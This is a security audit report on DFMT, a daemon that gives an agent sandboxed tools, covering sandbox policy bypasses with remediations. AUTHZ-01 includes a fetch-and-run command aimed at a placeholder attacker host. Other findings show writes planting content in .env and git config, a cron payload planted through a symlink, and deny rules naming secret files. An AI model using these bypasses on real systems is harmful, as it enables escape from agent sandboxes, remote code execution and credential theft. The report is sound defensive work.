# sc-authz Results — DFMT Authorization Security

**Target:** DFMT authorization model — journal access control, sandbox escalation, MCP/HTTP/socket access control
**Scan date:** 2026-05-01
**Previous scan:** 2026-04-26 (sc-authz-results.md, sc-sandbox-results.md)

---

## Executive Summary

**No classic IDOR or broken access control within a single daemon instance.** DFMT is a single-user daemon; all transports route through the same `Handlers` which serve a single project. There is no multi-tenant isolation within one daemon.

**The primary authorization risk is sandbox-to-daemon escalation** via vulnerabilities in the policy enforcement layer (SB-1, SB-2, SB-3 from sc-sandbox), not via transport-level IDOR.

**Key architectural point:** The sandbox (`Handlers.Exec`, `Handlers.Write`, etc.) runs as the **same OS user** as the daemon. Any file the daemon can write (journal, index), the sandbox tools can also write. This is not a bug — it is the design. The question is whether the policy layer correctly restricts what the sandbox can do.

---

## Findings

### AUTHZ-01 — Critical RCE: Command substitution inside double quotes bypasses policy chain detection

- **Severity:** Critical
- **CWE:** CWE-78 (OS Command Injection) / CWE-94 (Code Injection)
- **Confidence:** High
- **File:** `internal/sandbox/permissions.go:613-722` (`splitByShellOperators`)
- **Description:** The policy layer detects shell operators (`|`, `&`, `;`, `&&`, `||`) and command substitutions (`$(...)`, backticks) to split commands into policy-checked segments. However, `$(...)` and backticks **inside double quotes** are not recursively split — the quote-aware loop preserves them verbatim:

  ```go
  } else if !inQuote {
      if c == '$' && i+1 < len(cmd) && cmd[i+1] == '(' { ... recursion ... }
      if c == '`' { ... recursion ... }
  } else {
      current.WriteByte(c)   // inside quotes — substitution markers preserved verbatim
  }
  ```

  Bash still expands `$(...)` and backticks inside double quotes. A policy-checked base command (`git`) passes the allow rule, but the full command runs the substitution.

  Concrete bypass:
  ```
  Code: git "$(curl http://attacker/x.sh | sh)"
  Lang: bash
  ```

  Walk-through:
  1. `hasShellChainOperators` returns true (sees `$(`).
  2. `extractBaseCommand` returns `git` (quote-aware, stops at first unquoted space).
  3. `policy.Evaluate("exec", "git")` matches the default `git` allow rule.
  4. Full-command deny check anchors with `^...$`; the actual string starts with `git` so it never matches.
  5. `splitByShellOperators` returns a single part — the entire `git "..."` string — because `$(...)` is inside `"..."`.
  6. `bash -c 'git "$(curl ... | sh)"'` runs the substitution → arbitrary remote code execution.

- **Impact:** Full RCE as the daemon user. Can write to journal, index, config files, and any file the daemon user owns. The sandbox runs code as the same OS user.

- **Remediation:** Make the parser quote-aware: even inside double quotes, scan for `$(...)` and `` `...` `` and recurse. Single-quote contents stay opaque (bash does not expand there). The existing test `TestBackgroundOperatorQuotedAmpersandIgnored` correctly handles `&` inside quotes but does not cover `$(...)` substitution inside quotes.

- **Reference:** CWE-78 — https://cwe.mitre.org/data/definitions/78.html
  CWE-94 — https://cwe.mitre.org/data/definitions/94.html

---

### AUTHZ-02 — High: Glob/Grep read deny rules bypassed on per-file evaluation

- **Severity:** High
- **CWE:** CWE-22 (Path Traversal)
- **Confidence:** High
- **File:** `internal/sandbox/permissions.go:1058-1155` (Glob), `1157-1278` (Grep)
- **Description:** Glob and Grep helpers run `s.PolicyCheck("read", absWd)` once against the working-directory path, then read every matched file with `os.ReadFile(fullPath)` without per-file policy checks. The read deny rules:

  ```go
  {Op: "read", Text: ".env*"},
  {Op: "read", Text: "**/.env*"},
  {Op: "read", Text: "**/secrets/**"},
  {Op: "read", Text: "**/id_rsa"},
  {Op: "read", Text: "**/id_*"},
  ```

  are evaluated against the wd path (e.g., `D:\proj\foo`), which never matches `.env*`. The per-file paths are never checked against the deny rules.

- **Impact:** `dfmt_glob` with `pattern: "**/.env*"` and `intent: "AWS_KEY|TOKEN"` returns matched lines from `.env`, `.env.local`, etc. as `Matches[].Text`. `dfmt_grep` with `pattern: "AWS_SECRET"` reads every file under wd including `**/.env*`, `**/secrets/**`, `**/id_rsa` and returns the matched line. Secrets exfiltrated via the MCP tool response.

- **Remediation:** In Glob's per-file loop and Grep's per-file scan, run `s.PolicyCheck("read", fullPath)` before opening the file. Skip files that fail the check.

- **Reference:** CWE-22 — https://cwe.mitre.org/data/definitions/22.html

---

### AUTHZ-03 — High: Windows write/edit deny rules don't normalize backslash path separators

- **Severity:** High
- **CWE:** CWE-22 (Path Traversal) / CWE-434 (Unrestricted Upload)
- **Confidence:** High
- **File:** `internal/sandbox/permissions.go:224-240` (`globMatch`)
- **Description:** `globMatch` calls `filepath.ToSlash(text)` only for `op == "read"`:

  ```go
  if op == "read" {
      text = filepath.ToSlash(text)
      pattern = filepath.ToSlash(pattern)
  }
  ```

  `write`, `edit`, and `fetch` keep the platform path separator. On Windows, `Sandbox.Write()` calls `filepath.Clean(absPath)` which produces `C:\proj\.env`. The deny rule `**/.env*` is compiled with `/` separators; the regex `^.*/\.env[^/]*$` does not match `C:\proj\.env`.

  Concrete bypass on Windows:
  ```
  dfmt_write path=".env"           content="AWS_KEY=stolen"    → succeeds
  dfmt_write path=".git/config"    content="..."                → succeeds
  dfmt_write path=".dfmt/journal.jsonl" content="..."          → succeeds
  dfmt_edit  path=".env"  old_string="real"  new_string="planted" → succeeds
  ```

- **Impact:** On Windows, the sandbox can write/edit files that should be denied: `.env`, `.git/config`, SSH keys, and the daemon's own journal and index files. RCE via git config hooks is possible.

- **Remediation:** Apply `filepath.ToSlash` for all path-based ops (`read`, `write`, `edit`), not just `read`. The existing comment at line 225 says "for path-based ops" but implementation forgot the others.

- **Reference:** CWE-22 — https://cwe.mitre.org/data/definitions/22.html
  CWE-434 — https://cwe.mitre.org/data/definitions/434.html

---

### AUTHZ-04 — Medium: Write/Edit symlink containment check skipped when EvalSymlinks errors

- **Severity:** Medium
- **CWE:** CWE-59 (Symlink Attack)
- **Confidence:** High
- **File:** `internal/sandbox/permissions.go:1430-1442` (Write), `1351-1361` (Edit)
- **Description:** The symlink containment check runs only when `filepath.EvalSymlinks(cleanPath)` succeeds. If EvalSymlinks fails (non-existent target, permission error, etc.), the check is skipped and `os.WriteFile` follows the symlink:

  ```go
  if resolved, rerr := filepath.EvalSymlinks(cleanPath); rerr == nil {
      ... containment check ...
  }
  // rerr != nil → check skipped → symlink followed
  ```

  Exploit: a dangling symlink `wd/leak.txt` → `/etc/cron.d/dfmt-payload` (target does not exist yet). Agent calls `dfmt_write path="leak.txt" content="* * * * * root sh -c '...'"`. EvalSymlinks fails → check skipped → file created outside wd.

- **Impact:** Write outside the working directory via a dangling symlink. Limited to creating new files (Edit requires existing file).

- **Remediation:** When `EvalSymlinks` errors with anything other than ENOENT on a non-symlink leaf, refuse the write. Alternatively, open with `O_NOFOLLOW` so symlink leaf is rejected at write time.

- **Reference:** CWE-59 — https://cwe.mitre.org/data/definitions/59.html

---

### AUTHZ-05 — Info: `Op: "edit"` deny rules are dead code

- **Severity:** Info
- **CWE:** CWE-710 (Incorrect Quality Name)
- **File:** `internal/sandbox/permissions.go:150-167` (deny rules), `internal/sandbox/permissions.go:1364` (`Edit()` calls `PolicyCheck("write", ...)`)
- **Description:** Deny rules with `Op: "edit"` are never evaluated because `Sandbox.Edit()` calls `s.PolicyCheck("write", cleanPath)`. Every `edit` deny rule is duplicated as a `write` rule, so protection is preserved — but the `edit`-specific rules are dead code.

- **Impact:** Maintenance hazard — duplicate rule sets invite drift. If a future rule is added to `edit` but not `write`, it silently provides no protection.

- **Remediation:** Either delete the `Op: "edit"` rules or change `Edit()` to call both `PolicyCheck("write", ...)` and `PolicyCheck("edit", ...)`. Removing them is cleaner.

- **Reference:** CWE-710 — https://cwe.mitre.org/data/definitions/710.html

---

## Cross-Transport Authorization Analysis

### Can one process read another process's journal?

**No, via OS-level isolation.** Each daemon runs as its own process with its own journal file (default `~/.dfmt/journal.jsonl`). The journal file is mode 0o600 — only the owning UID can read it. A second DFMT daemon running as the same UID can read the first daemon's journal file directly (same UID = same permissions), but this is by design in the "same UID = trusted" model.

A different user on the same host cannot read the journal — the filesystem permission blocks it.

**However:** Any process running as the same UID can connect to the daemon's socket/HTTP port and use `Recall`/`Search` to read all events. This is also by design.

### Can sandboxed tools escalate to daemon-level access?

**Yes, via SB-1 (command substitution RCE).** A sandbox tool (`dfmt_exec`) that can break out of the policy can:
1. Write directly to `~/.dfmt/journal.jsonl` (mode 0o600, same UID)
2. Modify `.dfmt/index.sqlite` (same UID)
3. Write to config files, SSH keys, git config hooks
4. Use `dfmt_write` to overwrite any file the daemon user owns

The daemon runs the sandbox as the same OS user. The policy layer is the only gate, and SB-1 bypasses it for command substitution in double quotes.

### MCP authentication

There is **no MCP authentication** (documented as by-design — MCP stdio is the agent's private channel). Any process that can spawn `dfmt mcp` or send JSON-RPC over stdio can call all tools. This is not an authZ gap — it is the design.

### Dashboard auth

The dashboard (`/dashboard`, `/dashboard.js`) has **no authentication**. Any browser that can reach the loopback port can view the full session history, stats, and event timeline via the dashboard JS. This is within the "same UID = trusted" model — the dashboard provides a UI to data that the same UID can already read directly from `journal.jsonl`.

---

## Verified Clean Controls

| Control | Location | Status |
|---|---|---|
| `/api/daemons` filtered to current project (V-4 fix) | `http.go:659-668` | PASS — `projectPath` filter; fails closed when unset (F-16) |
| Journal file mode 0o600 | `journal.go:140` | PASS — directory mode 0o700 |
| Unix socket mode 0o700 + chmod failure logged | `socket.go:97-104` | PASS |
| Host header validation (DNS rebinding defense) | `http.go:270-311` | PASS |
| Same-origin Origin gate | `http.go:247-261` | PASS |
| Per-daemon journal/index isolation | `daemon.go` | PASS — no cross-daemon API |
| CSP on dashboard (`script-src 'self'`) | `http.go:519-528` | PASS |
| X-Frame-Options DENY on dashboard | `http.go:519-528` | PASS |
| Read deny rules (`.env*`, `**/secrets/**`, etc.) | `permissions.go:150-167` | PASS for direct `Read`; **BYPASSED for Glob/Grep** (AUTHZ-02) |

---

## Prior Scan Status

| Finding | Status |
|---|---|
| V-4 (`/api/daemons` disclosure) | CLOSED — fixed in R16-7 (`http.go:659-668`) |
| R15-2 (Windows TCP dashboard auth partial) | ACKNOWLEDGED — token generated but not enforced; by design |
| SB-1 (quoted substitution RCE) | OPEN — critical, unresolved |
| SB-2 (Glob/Grep deny bypass) | OPEN — high, unresolved |
| SB-3 (Windows write deny path norm) | OPEN — high, unresolved |
| SB-4 (symlink TOCTOU) | OPEN — medium, unresolved |
| SB-6 (`Op: "edit"` dead rules) | OPEN — info, unresolved |

---

## AuthZ Model Notes

DFMT's trust model: **"same UID = trusted."** The bearer token is documentation-only and not used for access control. All authorization within a daemon instance is based on:
1. OS-level file permissions (journal, index, socket)
2. The sandbox policy layer (permissions.go) for sandbox tool calls

There is no per-request or per-session authorization because there is no authentication. All requests from any connected client have full access to all tools and data within that daemon.

The authorization boundary is:
- **Between daemons**: OS-level UID separation + per-daemon journal/index (no cross-daemon API)
- **Within a daemon**: None (no auth = no per-client authorization)

This is consistent and intentional for a single-user local daemon.